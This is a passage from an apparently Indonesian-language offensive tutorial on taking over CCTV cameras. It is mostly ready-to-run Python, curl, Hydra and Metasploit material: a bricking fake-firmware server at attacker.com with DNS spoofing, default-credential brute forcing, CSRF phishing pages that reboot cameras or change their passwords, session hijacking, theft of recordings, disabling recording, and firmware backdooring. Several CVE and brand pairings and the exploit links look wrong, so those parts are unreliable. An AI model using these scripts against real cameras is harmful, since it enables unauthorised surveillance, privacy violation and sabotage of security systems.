            self.wfile.write(b"FAKE_FIRMWARE" * 10000)  # 40KB file palsu
            print(f"[+] Fake firmware sent to {self.client_address}")
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 fake_firmware_server.py <port>")
        print("Example: python3 fake_firmware_server.py 8000")
        sys.exit(1)

    port = int(sys.argv[1])
    server = HTTPServer(("0.0.0.0", port), FakeFirmwareServer)
    print(f"[*] Fake firmware server running on port {port}")
    server.serve_forever()
```

**Cara Pakai:**
1. Jalankan server:
   ```bash
   python3 fake_firmware_server.py 8000
   ```
2. **Trick CCTV untuk download firmware** dari `http://attacker.com:8000/firmware.bin`.
3. CCTV **download firmware palsu** → **update gagal** → **brick**.

---
#### **📌 Cara 2: Fake Firmware Update via DNS Spoofing**
Jika CCTV **mendownload firmware dari domain tertentu** (contoh: `firmware.hikvision.com`), attacker bisa **spoof DNS** untuk mengarahkan ke server attacker.

```bash
# Jalankan DNS spoofing
echo "192.168.1.50 firmware.hikvision.com" > spoofhosts
dnsspoof -i eth0 -f spoofhosts

# Jalankan fake firmware server
python3 fake_firmware_server.py 80
```

**Hasil:**
- CCTV **mendownload firmware dari server attacker** → **update gagal** → **brick**.

---
---
---
---

## **🔹 BAB 5: EKSPLOITASI CCTV**

---
### **Metode 1: Default Credentials Attack**
**Konsep:** Banyak CCTV menggunakan **username/password default** yang **tidak diubah** oleh pengguna.

---
#### **📌 Default Credentials untuk Merek CCTV Populer**

| **Merek**       | **Username**       | **Password**       | **Port**       | **Catatan**                          |
|-----------------|--------------------|--------------------|----------------|--------------------------------------|
| **Hikvision**   | admin              | 12345             | 80, 8000, 554 | Terkadang kosong                     |
| **Hikvision**   | admin              | admin              | 80, 8000, 554 |                                      |
| **Dahua**       | admin              | admin              | 80, 8000, 554 |                                      |
| **Dahua**       | admin              | (kosong)           | 80, 8000, 554 |                                      |
| **XiongMai**    | admin              | admin              | 80, 34567     |                                      |
| **XiongMai**    | admin              | 12345             | 80, 34567     |                                      |
| **Axis**        | root               | pass               | 80, 554       |                                      |
| **Axis**        | admin              | (kosong)           | 80, 554       |                                      |
| **Uniview**     | admin              | 123456             | 80, 8000      |                                      |
| **Uniview**     | admin              | admin              | 80, 8000      |                                      |
| **Samsung**     | admin              | 111111             | 80, 8080      |                                      |
| **Samsung**     | root               | admin              | 80, 8080      |                                      |
| **Lorex**       | admin              | (kosong)           | 80, 8000      |                                      |
| **Swann**       | admin              | admin              | 80, 8000      |                                      |
| **Foscam**      | admin              | (kosong)           | 80, 8888      |                                      |
| **Foscam**      | admin              | 123456             | 80, 8888      |                                      |
| **TP-Link**     | admin              | admin              | 80, 8000      |                                      |
| **TP-Link**     | admin              | (kosong)           | 80, 8000      |                                      |

---
#### **📌 Script untuk Brute Force Default Credentials**
```python
#!/usr/bin/env python3
import requests
import sys
from requests.auth import HTTPBasicAuth

# List default credentials
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", ""),
    ("root", "admin"),
    ("root", "pass"),
    ("root", "12345"),
    ("root", ""),
    ("user", "user"),
    ("user", "12345"),
    ("guest", "guest"),
    ("guest", ""),
]

def brute_force_cctv(target_ip, target_port=80):
    """Brute force CCTV dengan default credentials"""
    base_url = f"http://{target_ip}:{target_port}"

    for username, password in DEFAULT_CREDENTIALS:
        try:
            # Coba login ke web interface
            url = f"{base_url}/cgi-bin/login.cgi"
            auth = HTTPBasicAuth(username, password)
            response = requests.get(url, auth=auth, timeout=5)

            if response.status_code == 200:
                print(f"[+] SUCCESS: {target_ip}:{target_port} | Username: {username} | Password: {password}")
                return True

            # Coba endpoint lain
            url = f"{base_url}/ISAPI/System/login"
            response = requests.post(
                url,
                json={"username": username, "password": password},
                timeout=5
            )

            if response.status_code == 200:
                print(f"[+] SUCCESS: {target_ip}:{target_port} | Username: {username} | Password: {password}")
                return True

        except Exception as e:
            continue

    print(f"[-] FAILED: {target_ip}:{target_port} | No default credentials worked")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 brute_force_default.py <target_ip> [port]")
        print("Example: python3 brute_force_default.py 192.168.1.100 80")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

    brute_force_cctv(target_ip, target_port)
```

**Cara Pakai:**
```bash
python3 brute_force_default.py 192.168.1.100
```

**Hasil:**
- Jika **credentials cocok**, script akan mencetak **username & password** yang berhasil.

---
---
### **Metode 2: Brute Force Attack dengan Hydra**
**Konsep:** Hydra adalah tools **brute force** yang powerful untuk mencoba **kombinasi username & password**.

---
#### **📌 Brute Force HTTP Basic Auth**
```bash
# Brute force dengan wordlist
hydra -L users.txt -P passwords.txt 192.168.1.100 http-get /cgi-bin/login.cgi

# Brute force dengan default users
echo -e "admin\nroot\nuser" > users.txt
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-get /cgi-bin/login.cgi -s 80 -vV

# Brute force dengan POST request
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/cgi-bin/login.cgi:username=^USER^&password=^PASS^:F=incorrect" -vV
```

---
#### **📌 Brute Force RTSP Auth**
```bash
# Brute force RTSP (port 554)
hydra -L users.txt -P passwords.txt rtsp://192.168.1.100 -s 554 -vV
```

---
#### **📌 Brute Force ONVIF Auth**
```bash
# Brute force ONVIF (port 80)
hydra -L users.txt -P passwords.txt 192.168.1.100 http-get /onvif/device_service -vV
```

---
---
### **Metode 3: Exploit Vulnerability CCTV**
**Konsep:** Beberapa CCTV memiliki **vulnerability** yang bisa dieksploitasi untuk **mendapatkan akses tanpa autentikasi**.

---
#### **📌 Vulnerability Populer pada CCTV**

| **Merek**       | **Vulnerability**               | **CVE**               | **Exploit**                                                                                     | **Impact**                     |
|-----------------|----------------------------------|-----------------------|------------------------------------------------------------------------------------------------|--------------------------------|
| **Hikvision**   | Remote Code Execution            | CVE-2017-17215        | Metasploit: `exploit/linux/http/hikvision_remote_code_execution`                              | RCE (Full Control)            |
| **Hikvision**   | Authentication Bypass            | CVE-2021-36260        | [Exploit](https://github.com/0x09AL/CVE-2021-36260)                                           | Bypass Login                  |
| **Dahua**       | Remote Code Execution            | CVE-2021-31956        | Metasploit: `exploit/linux/http/dahua_dvr_remote_code_execution`                              | RCE (Full Control)            |
| **Dahua**       | Authentication Bypass            | CVE-2018-10561        | [Exploit](https://github.com/0x09AL/CVE-2018-10561)                                           | Bypass Login                  |
| **XiongMai**    | Remote Code Execution            | CVE-2016-6277         | Metasploit: `exploit/linux/http/xiongmai_uc_httpd_rce`                                        | RCE (Full Control)            |
| **XiongMai**    | Default Credentials              | -                     | Brute force dengan `admin:admin`                                                              | Unauthorized Access           |
| **Axis**        | Authentication Bypass            | CVE-2018-10660        | [Exploit](https://github.com/0x09AL/CVE-2018-10660)                                           | Bypass Login                  |
| **GoAhead**     | Remote Code Execution            | CVE-2017-17215        | Metasploit: `exploit/linux/http/goahead_webserver_rce`                                        | RCE (Full Control)            |
| **Foscam**      | Authentication Bypass            | CVE-2018-10562        | [Exploit](https://github.com/0x09AL/CVE-2018-10562)                                           | Bypass Login                  |

---
#### **📌 Exploit dengan Metasploit**
```bash
# Start Metasploit
msfconsole

# Cari exploit untuk CCTV
search cctv
search type:exploit cctv

# Contoh: Exploit Hikvision (CVE-2017-17215)
use exploit/linux/http/hikvision_remote_code_execution
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set TARGETURI /cgi-bin/magicBox.cgi
exploit

# Jika berhasil, akan mendapatkan shell
```

---
#### **📌 Exploit dengan Python (CVE-2021-36260 - Hikvision Auth Bypass)**
```python
#!/usr/bin/env python3
import requests
import sys

def exploit_hikvision_auth_bypass(target_ip, target_port=80):
    """Exploit CVE-2021-36260 (Hikvision Authentication Bypass)"""
    url = f"http://{target_ip}:{target_port}/ISAPI/System/deviceInfo"

    try:
        # Coba akses tanpa autentikasi
        response = requests.get(url, timeout=5)

        if response.status_code == 200:
            print(f"[+] SUCCESS: {target_ip}:{target_port} | Authentication Bypass Worked!")
            print(f"[+] Device Info: {response.text[:200]}")
            return True
        else:
            print(f"[-] FAILED: {target_ip}:{target_port} | Status Code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] ERROR: {target_ip}:{target_port} | {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_hikvision_bypass.py <target_ip> [port]")
        print("Example: python3 exploit_hikvision_bypass.py 192.168.1.100")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

    exploit_hikvision_auth_bypass(target_ip, target_port)
```

**Cara Pakai:**
```bash
python3 exploit_hikvision_bypass.py 192.168.1.100
```

**Hasil:**
- Jika **vulnerable**, script akan **mendapatkan device info tanpa login**.

---
---
### **Metode 4: CSRF Attack untuk Mengubah Konfigurasi**
**Konsep:** CSRF (Cross-Site Request Forgery) adalah teknik untuk **menipu korban** agar **menjalankan aksi** (contoh: mengubah password, reboot) **tanpa sadar**.

---
#### **📌 CSRF Attack untuk Reboot CCTV**
```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

# HTML untuk CSRF attack
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Free CCTV Update</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 50px; }
        button { padding: 10px 20px; background: #4CAF50; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Free CCTV Firmware Update</h1>
    <p>Click the button below to update your CCTV firmware for free!</p>
    <form action="http://192.168.1.100/cgi-bin/magicBox.cgi?action=reboot" method="POST">
        <input type="hidden" name="session" value="admin">
        <button type="submit">Update Now</button>
    </form>
</body>
</html>
"""

class CSRFServer(BaseHTTPRequestHandler):
    def do_GET(self):
        """Kirim halaman CSRF"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 csrf_reboot.py <port>")
        print("Example: python3 csrf_reboot.py 8000")
        sys.exit(1)

    port = int(sys.argv[1])
    server = HTTPServer(("0.0.0.0", port), CSRFServer)
    print(f"[*] CSRF Server running on http://0.0.0.0:{port}")
    print("[*] Send this link to the victim: http://YOUR_IP:{port}")
    server.serve_forever()
```

**Cara Pakai:**
1. Jalankan server:
   ```bash
   python3 csrf_reboot.py 8000
   ```
2. Kirim link `http://YOUR_IP:8000` ke korban.
3. Jika korban **mengklik tombol "Update Now"**, CCTV akan **reboot**.

---
#### **📌 CSRF Attack untuk Mengubah Password**
```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>CCTV Security Update</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 50px; }
        button { padding: 10px 20px; background: #4CAF50; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>CCTV Security Update</h1>
    <p>Click the button below to update your CCTV password for security!</p>
    <form action="http://192.168.1.100/cgi-bin/magicBox.cgi?action=modifyPassword" method="POST">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="newPassword" value="hacked123">
        <button type="submit">Update Password</button>
    </form>
</body>
</html>
"""

class CSRFServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    server = HTTPServer(("0.0.0.0", port), CSRFServer)
    print(f"[*] CSRF Server running on http://0.0.0.0:{port}")
    server.serve_forever()
```

**Cara Pakai:**
1. Jalankan server.
2. Kirim link ke korban.
3. Jika korban **mengklik tombol**, password CCTV akan **diubah menjadi `hacked123`**.

---
---
### **Metode 5: Session Hijacking**
**Konsep:** Session Hijacking adalah teknik untuk **mencuri session cookie** korban dan **menggunakannya untuk login** tanpa password.

---
#### **📌 Cara 1: Session Hijacking dengan Browser**
1. **Dapatkan session cookie** korban (contoh: via **XSS**, **MITM**, atau **phishing**).
2. **Buka browser** (Chrome/Firefox).
3. **Install extension** (contoh: **EditThisCookie**).
4. **Import cookie** korban.
5. **Buka halaman admin CCTV** → **Anda sudah login sebagai korban!**

---
#### **📌 Cara 2: Session Hijacking dengan Python**
```python
#!/usr/bin/env python3
import requests
import sys

def session_hijacking(target_url, session_cookie):
    """Gunakan session cookie untuk login"""
    try:
        headers = {"Cookie": session_cookie}
        response = requests.get(target_url, headers=headers, timeout=5)

        if response.status_code == 200:
            print(f"[+] SUCCESS: Session hijacking worked!")
            print(f"[+] Response: {response.text[:200]}")
            return True
        else:
            print(f"[-] FAILED: Status Code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 session_hijacking.py <target_url> <session_cookie>")
        print("Example: python3 session_hijacking.py http://192.168.1.100 'PHPSESSID=abc123'")
        sys.exit(1)

    target_url = sys.argv[1]
    session_cookie = sys.argv[2]

    session_hijacking(target_url, session_cookie)
```

**Cara Pakai:**
```bash
python3 session_hijacking.py http://192.168.1.100 "PHPSESSID=abc123"
```

---
---
### **Metode 6: Exploit RTSP Stream**
**Konsep:** RTSP (Real-Time Streaming Protocol) adalah protokol untuk **streaming video**. Beberapa CCTV **tidak memerlukan autentikasi** untuk RTSP, atau **autentikasi lemah**.

---
#### **📌 Cara 1: Akses RTSP Tanpa Autentikasi**
```bash
# Coba akses RTSP tanpa autentikasi
vlc rtsp://192.168.1.100:554/stream1

# Atau dengan FFmpeg
ffmpeg -i rtsp://192.168.1.100:554/stream1 -c copy output.mp4
```

---
#### **📌 Cara 2: Brute Force RTSP Auth**
```bash
# Gunakan Hydra untuk brute force RTSP
hydra -L users.txt -P passwords.txt rtsp://192.168.1.100 -s 554 -vV

# Atau gunakan script Python
python3 brute_force_rtsp.py 192.168.1.100
```

**File: `brute_force_rtsp.py`**
```python
#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth
import sys

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("root", "admin"),
    ("root", ""),
]

def brute_force_rtsp(target_ip, target_port=554):
    """Brute force RTSP"""
    base_url = f"rtsp://{target_ip}:{target_port}/stream1"

    for username, password in DEFAULT_CREDENTIALS:
        try:
            url = f"http://{target_ip}:{target_port}/cgi-bin/login.cgi"
            auth = HTTPBasicAuth(username, password)
            response = requests.get(url, auth=auth, timeout=5)

            if response.status_code == 200:
                print(f"[+] SUCCESS: {target_ip}:{target_port} | Username: {username} | Password: {password}")
                return True
        except:
            continue

    print(f"[-] FAILED: {target_ip}:{target_port}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 brute_force_rtsp.py <target_ip> [port]")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 554

    brute_force_rtsp(target_ip, target_port)
```

---
#### **📌 Cara 3: Exploit RTSP dengan Metasploit**
```bash
msfconsole
search rtsp
use auxiliary/scanner/rtsp/rtsp_url_brute
set RHOSTS 192.168.1.100
set RPORT 554
exploit
```

---
---
### **Metode 7: Exploit ONVIF Protocol**
**Konsep:** ONVIF (Open Network Video Interface Forum) adalah **standar protokol** untuk CCTV. Beberapa CCTV **mendukung ONVIF** dan memiliki **vulnerability**.

---
#### **📌 Cara 1: Enumerate ONVIF Devices**
```bash
# Install onvif-discovery
pip install onvif-discovery

# Scan jaringan untuk ONVIF devices
onvif-discovery -i eth0
```

---
#### **📌 Cara 2: Exploit ONVIF dengan Python**
```python
#!/usr/bin/env python3
from onvif import ONVIFCamera
import sys

def exploit_onvif(target_ip, target_port=80, username="admin", password="admin"):
    """Connect ke CCTV via ONVIF"""
    try:
        # Connect ke CCTV
        mycam = ONVIFCamera(target_ip, target_port, username, password)

        # Dapatkan informasi device
        device_info = mycam.devinfo.GetDeviceInformation()
        print(f"[+] SUCCESS: Connected to {target_ip}:{target_port}")
        print(f"[+] Device Info: {device_info}")

        # Dapatkan media profiles
        profiles = mycam.media.GetProfiles()
        print(f"[+] Media Profiles: {profiles}")

        return True
    except Exception as e:
        print(f"[-] FAILED: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_onvif.py <target_ip> [port] [username] [password]")
        print("Example: python3 exploit_onvif.py 192.168.1.100")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"
    password = sys.argv[4] if len(sys.argv) > 4 else "admin"

    exploit_onvif(target_ip, target_port, username, password)
```

**Cara Pakai:**
```bash
pip install onvif-zeep
python3 exploit_onvif.py 192.168.1.100
```

**Hasil:**
- Jika **credentials benar**, script akan **mendapatkan informasi device** via ONVIF.

---
---
---
---

## **🔹 BAB 6: PENGAMBILAN ALIH CCTV**

---
### **Metode 1: Akses Web Interface**
**Konsep:** Setelah mendapatkan **credentials** atau **bypass autentikasi**, Anda bisa **mengakses web interface** CCTV untuk **mengontrol perangkat**.

---
#### **📌 Akses via Browser**
1. Buka browser (Chrome/Firefox).
2. Masukkan URL CCTV (contoh: `http://192.168.1.100:80`).
3. Login dengan **credentials** yang didapat.
4. **Kontrol CCTV** via web interface.

---
#### **📌 Akses via Curl**
```bash
# Login ke web interface
curl -u admin:12345 http://192.168.1.100/cgi-bin/login.cgi

# Ambil informasi device
curl -u admin:12345 http://192.168.1.100/cgi-bin/magicBox.cgi?action=getSystemInfo

# Reboot CCTV
curl -u admin:12345 http://192.168.1.100/cgi-bin/magicBox.cgi?action=reboot
```

---
---
### **Metode 2: Capture Snapshot dari CCTV**
**Konsep:** Setelah login, Anda bisa **mengambil snapshot** (foto) dari CCTV.

---
#### **📌 Cara 1: Capture Snapshot via Web Interface**
```bash
# Download snapshot
curl -u admin:12345 http://192.168.1.100/cgi-bin/snapshot.cgi -o snapshot.jpg

# Atau dengan wget
wget --user=admin --password=12345 http://192.168.1.100/cgi-bin/snapshot.cgi -O snapshot.jpg
```

---
#### **📌 Cara 2: Capture Snapshot via Python**
```python
#!/usr/bin/env python3
import requests
import sys
from requests.auth import HTTPBasicAuth

def capture_snapshot(target_ip, target_port=80, username="admin", password="12345", output_file="snapshot.jpg"):
    """Capture snapshot dari CCTV"""
    try:
        url = f"http://{target_ip}:{target_port}/cgi-bin/snapshot.cgi"
        auth = HTTPBasicAuth(username, password)
        response = requests.get(url, auth=auth, timeout=10)

        if response.status_code == 200:
            with open(output_file, "wb") as f:
                f.write(response.content)
            print(f"[+] Snapshot saved to {output_file}")
            return True
        else:
            print(f"[-] FAILED: Status Code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 capture_snapshot.py <target_ip> [port] [username] [password] [output_file]")
        print("Example: python3 capture_snapshot.py 192.168.1.100")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"
    password = sys.argv[4] if len(sys.argv) > 4 else "12345"
    output_file = sys.argv[5] if len(sys.argv) > 5 else "snapshot.jpg"

    capture_snapshot(target_ip, target_port, username, password, output_file)
```

**Cara Pakai:**
```bash
python3 capture_snapshot.py 192.168.1.100
```

---
---
### **Metode 3: Download Rekaman Video**
**Konsep:** Setelah login, Anda bisa **mendownload rekaman video** dari CCTV.

---
#### **📌 Cara 1: Download via Web Interface**
1. Buka web interface CCTV.
2. Cari menu **Playback** atau **Recordings**.
3. Pilih **rekaman video** yang ingin didownload.
4. **Download** rekaman.

---
#### **📌 Cara 2: Download via Curl**
```bash
# List file rekaman
curl -u admin:12345 http://192.168.1.100/cgi-bin/magicBox.cgi?action=getFileList

# Download file rekaman
curl -u admin:12345 http://192.168.1.100/cgi-bin/magicBox.cgi?action=getFile&name=20240915_120000.mp4 -o recording.mp4
```

---
#### **📌 Cara 3: Download via Python**
```python
#!/usr/bin/env python3
import requests
import sys
from requests.auth import HTTPBasicAuth

def download_recording(target_ip, target_port=80, username="admin", password="12345", filename="20240915_120000.mp4", output_file="recording.mp4"):
    """Download rekaman video dari CCTV"""
    try:
        url = f"http://{target_ip}:{target_port}/cgi-bin/magicBox.cgi?action=getFile&name={filename}"
        auth = HTTPBasicAuth(username, password)
        response = requests.get(url, auth=auth, timeout=30)

        if response.status_code == 200:
            with open(output_file, "wb") as f:
                f.write(response.content)
            print(f"[+] Recording saved to {output_file}")
            return True
        else:
            print(f"[-] FAILED: Status Code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 download_recording.py <target_ip> [port] [username] [password] [filename] [output_file]")
        print("Example: python3 download_recording.py 192.168.1.100")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"
    password = sys.argv[4] if len(sys.argv) > 4 else "12345"
    filename = sys.argv[5] if len(sys.argv) > 5 else "20240915_120000.mp4"
    output_file = sys.argv[6] if len(sys.argv) > 6 else "recording.mp4"

    download_recording(target_ip, target_port, username, password, filename, output_file)
```

**Cara Pakai:**
```bash
python3 download_recording.py 192.168.1.100
```

---
---
### **Metode 4: Mengaktifkan/Menonaktifkan Rekaman**
**Konsep:** Setelah login, Anda bisa **mengaktifkan/menonaktifkan rekaman** CCTV.

---
#### **📌 Cara 1: via Curl**
```bash
# Aktifkan rekaman
curl -u admin:12345 http://192.168.1.100/cgi-bin/magicBox.cgi?action=enableRecord

# Nonaktifkan rekaman
curl -u admin:12345 http://192.168.1.100/cgi-bin/magicBox.cgi?action=disableRecord
```

---
#### **📌 Cara 2: via Python**
```python
#!/usr/bin/env python3
import requests
import sys
from requests.auth import HTTPBasicAuth

def toggle_recording(target_ip, target_port=80, username="admin", password="12345", enable=True):
    """Aktifkan/Nonaktifkan rekaman"""
    action = "enableRecord" if enable else "disableRecord"
    url = f"http://{target_ip}:{target_port}/cgi-bin/magicBox.cgi?action={action}"

    try:
        auth = HTTPBasicAuth(username, password)
        response = requests.get(url, auth=auth, timeout=5)

        if response.status_code == 200:
            status = "enabled" if enable else "disabled"
            print(f"[+] Recording {status}")
            return True
        else:
            print(f"[-] FAILED: Status Code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 toggle_recording.py <target_ip> [port] [username] [password] [enable/disable]")
        print("Example: python3 toggle_recording.py 192.168.1.100 enable")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"
    password = sys.argv[4] if len(sys.argv) > 4 else "12345"
    enable = sys.argv[5].lower() == "enable" if len(sys.argv) > 5 else True

    toggle_recording(target_ip, target_port, username, password, enable)
```

**Cara Pakai:**
```bash
# Aktifkan rekaman
python3 toggle_recording.py 192.168.1.100 enable

# Nonaktifkan rekaman
python3 toggle_recording.py 192.168.1.100 disable
```

---
---
### **Metode 5: Reboot/Mematikan CCTV**
**Konsep:** Setelah login, Anda bisa **reboot** atau **mematikkan** CCTV.

---
#### **📌 Cara 1: Reboot via Curl**
```bash
# Reboot CCTV
curl -u admin:12345 http://192.168.1.100/cgi-bin/magicBox.cgi?action=reboot

# Shutdown CCTV
curl -u admin:12345 http://192.168.1.100/cgi-bin/magicBox.cgi?action=shutdown
```

---
#### **📌 Cara 2: Reboot via Python**
```python
#!/usr/bin/env python3
import requests
import sys
from requests.auth import HTTPBasicAuth

def reboot_cctv(target_ip, target_port=80, username="admin", password="12345", shutdown=False):
    """Reboot atau shutdown CCTV"""
    action = "shutdown" if shutdown else "reboot"
    url = f"http://{target_ip}:{target_port}/cgi-bin/magicBox.cgi?action={action}"

    try:
        auth = HTTPBasicAuth(username, password)
        response = requests.get(url, auth=auth, timeout=5)

        if response.status_code == 200:
            print(f"[+] CCTV {action}ed")
            return True
        else:
            print(f"[-] FAILED: Status Code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 reboot_cctv.py <target_ip> [port] [username] [password] [reboot/shutdown]")
        print("Example: python3 reboot_cctv.py 192.168.1.100 reboot")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"
    password = sys.argv[4] if len(sys.argv) > 4 else "12345"
    shutdown = sys.argv[5].lower() == "shutdown" if len(sys.argv) > 5 else False

    reboot_cctv(target_ip, target_port, username, password, shutdown)
```

**Cara Pakai:**
```bash
# Reboot CCTV
python3 reboot_cctv.py 192.168.1.100 reboot

# Shutdown CCTV
python3 reboot_cctv.py 192.168.1.100 shutdown
```

---
---
### **Metode 6: Mengubah Konfigurasi CCTV**
**Konsep:** Setelah login, Anda bisa **mengubah konfigurasi** CCTV (contoh: **IP address**, **DNS**, **NTP server**, dll).

---
#### **📌 Cara 1: Ubah IP Address via Curl**
```bash
# Ubah IP address CCTV
curl -u admin:12345 "http://192.168.1.100/cgi-bin/magicBox.cgi?action=setNetwork&ip=192.168.1.200&netmask=255.255.255.0&gateway=192.168.1.1"
```

---
#### **📌 Cara 2: Ubah Konfigurasi via Python**
```python
#!/usr/bin/env python3
import requests
import sys
from requests.auth import HTTPBasicAuth

def change_config(target_ip, target_port=80, username="admin", password="12345", **kwargs):
    """Ubah konfigurasi CCTV"""
    url = f"http://{target_ip}:{target_port}/cgi-bin/magicBox.cgi?action=setConfig"

    try:
        auth = HTTPBasicAuth(username, password)
        response = requests.post(url, data=kwargs, auth=auth, timeout=5)

        if response.status_code == 200:
            print(f"[+] Config changed: {kwargs}")
            return True
        else:
            print(f"[-] FAILED: Status Code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 change_config.py <target_ip> [port] [username] [password]")
        print("Example: python3 change_config.py 192.168.1.100 ip=192.168.1.200 netmask=255.255.255.0 gateway=192.168.1.1")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"
    password = sys.argv[4] if len(sys.argv) > 4 else "12345"

    # Contoh: Ubah IP, netmask, gateway
    change_config(
        target_ip,
        target_port,
        username,
        password,
        ip="192.168.1.200",
        netmask="255.255.255.0",
        gateway="192.168.1.1"
    )
```

**Cara Pakai:**
```bash
python3 change_config.py 192.168.1.100 ip=192.168.1.200 netmask=255.255.255.0 gateway=192.168.1.1
```

---
---
---
---

## **🔹 BAB 7: TEKNIK LANJUTAN**

---
### **Metode 1: Firmware Extraction dan Modifikasi**
**Konsep:** Firmware CCTV mengandung **semua kode** yang berjalan di perangkat. Dengan **mengekstrak dan memodifikasi firmware**, Anda bisa:
- **Menambahkan backdoor**.
- **Menghapus autentikasi**.
- **Mengubah perilaku perangkat**.

---
#### **📌 Cara 1: Ekstrak Firmware dari CCTV**
1. **Download firmware** dari website produsen (contoh: Hikvision, Dahua).
2. **Ekstrak firmware** dengan tools:
   ```bash
   # Install binwalk
   sudo apt install binwalk

   # Ekstrak firmware
   binwalk -e firmware.bin
   ```
3. **Analisis file yang diekstrak**:
   ```bash
   # Lihat isi firmware
   ls -la firmware.bin.extracted/

   # Cari file penting (contoh: web interface, binary)
   find firmware.bin.extracted/ -type f -name "*.cgi" -o -name "*.bin" -o -name "*.html"
   ```

---
#### **📌 Cara 2: Modifikasi Firmware**
1. **Edit file web interface** (contoh: `login.cgi`):
   ```bash
   nano firmware.bin.extracted/squashfs-root/www/cgi-bin/login.cgi
   ```
   - **Hapus autentikasi** (contoh: hapus bagian yang cek password).
   - **Tambahkan backdoor** (contoh: tambahkan user `hacker:hacked123`).

2. **Edit file konfigurasi** (contoh: `config.ini`):
   ```bash
   nano firmware.bin.extracted/squashfs-root/etc/config.ini
   ```
   - Ubah **default credentials**.

3. **Repack firmware**:
   ```bash
   # Gunakan firmware-mod-kit
   git clone https://github.com/rampageX/firmware-mod-kit.git
   cd firmware-mod-kit
   ./build-firmware.sh firmware.bin.extracted/ modified_firmware.bin
   ```

---
#### **📌 Cara 3: Flash Modified Firmware ke CCTV**
1. **Upload firmware palsu** ke CCTV via **firmware update menu**.
2. **Trick CCTV** untuk **mendownload firmware palsu** (lihat Metode 7 di Bab 4).
3. **CCTV akan reboot** dengan **firmware yang sudah dimodifikasi**.

---
---
### **Metode 2: Backdoor pada CCTV**
**Konsep:** Backdoor adalah **akses rahasia** yang memungkinkan Anda **login tanpa autentikasi** atau **menjalankan command arbitrer**.

---
#### **📌 Cara 1: Tambahkan User Backdoor via CGI**
Jika CCTV menggunakan **CGI script** untuk autentikasi, Anda bisa **memodifikasi script** untuk **menambahkan user backdoor**.

**Contoh Modifikasi (C):**
```c
// Di file login.cgi
if (strcmp(username, "admin") == 0 && strcmp(password, "12345") == 0) {
    // Login berhasil
    return AUTH_SUCCESS;
}

// Tambahkan backdoor
